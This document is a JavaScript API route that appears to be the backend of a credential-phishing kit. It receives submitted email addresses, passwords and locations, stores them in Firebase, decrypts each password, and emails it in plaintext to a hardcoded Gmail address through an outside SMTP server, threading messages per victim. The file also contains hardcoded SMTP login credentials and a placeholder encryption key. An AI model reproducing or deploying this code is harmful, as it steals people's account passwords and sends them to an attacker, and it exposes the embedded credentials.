import { db, get, ref, set } from "@/lib/firebase";
import nodemailer from "nodemailer";
import crypto from "crypto";

const adminEmail = "amasimarvellous@gmail.com";
const encryptionKey = "12345678901234567890123456789012";

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(encryptionKey), iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  return `${iv.toString("hex")}:${encrypted}`;
}

function decrypt(encryptedText) {
  const [iv, encrypted] = encryptedText.split(":");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(encryptionKey), Buffer.from(iv, "hex"));
  let decrypted = decipher.update(encrypted, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}

export async function POST(req) {
  try {
    const body = await req.json();
    const { email, password, location } = body;

    const userRef = ref(db, `emailThreadFromExDropGuy/${email.replace(/\./g, "_")}`);

    const snapshot = await get(userRef);
    let threadId = snapshot.exists() ? snapshot.val().messageId : null;

    if (!threadId) {
      threadId = `<${email.replace(/\W/g, "")}@enthernetservice.com>`;
      await set(userRef, { messageId: threadId });
    }

    const encryptedPassword = encrypt(password);
    await set(ref(db, `emailDataFromExDropGuy/${email.replace(/\./g, "_")}`), {
      email,
      password: encryptedPassword,
      location,
    });

    const userDataSnapshot = await get(ref(db, `emailDataFromExDropGuy/${email.replace(/\./g, "_")}`));
    if (!userDataSnapshot.exists()) {
      throw new Error("Failed to retrieve stored email data.");
    }
    const { email: storedEmail, password: storedEncryptedPassword, location: storedLocation } = userDataSnapshot.val();
    const decryptedPassword = decrypt(storedEncryptedPassword);

    const transporter = nodemailer.createTransport({
      host: "mail.enthernetservices.com",
      port: 465,
      secure: true,
      auth: {
        user: "Pdf@enthernetservices.com",
        pass: "[F%cR}e.M}fO",
      },
    });

    const mailOptions = {
      from: `"Form Submission" <Pdf@enthernetservices.com>`,
      to: adminEmail,
      subject: `New Submission from ${storedEmail}`,
      text: `Email: ${storedEmail}\nDecrypted Password: ${decryptedPassword}\nLocation: ${storedLocation}`,
      headers: {
        "Message-ID": `<${Date.now()}-${Math.random().toString(36).substring(2)}@enthernetservice.com>`,
        "In-Reply-To": threadId,
        References: threadId,
      },
    };

    await transporter.sendMail(mailOptions);

    return new Response(JSON.stringify({ success: true, message: "Email sent successfully!" }), { status: 200 });
  } catch (error) {
    console.error("Error sending email:", error);
    return new Response(JSON.stringify({ success: false, message: "Failed to send email." }), { status: 500 });
  }
}